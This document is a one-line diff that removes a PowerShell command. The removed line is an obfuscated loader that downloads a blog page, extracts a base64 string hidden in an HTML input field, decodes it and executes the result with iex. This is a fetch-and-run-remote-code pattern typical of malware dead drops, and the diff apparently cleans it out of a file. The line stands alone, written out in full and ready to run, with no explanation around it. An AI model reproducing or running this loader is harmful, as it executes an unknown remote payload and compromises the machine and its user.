@@ -1,1 +1,0 @@
-$JwkYbykb=(New-Object System.Net.WebClient).Downloadstring('https://poiuytre.tistory.com/4');$iPdUvXvO=[regex]::Match($JwkYbykb,'(?<=<input type="hidden" value=")(.*?)(?="></input>)').value;$WNiExwXhn  = [System.Convert]::FromBase64String($iPdUvXvO);$vgSzZWic=[System.Text.Encoding]::UTF8.GetString($WNiExwXhn);iex $vgSzZWic;
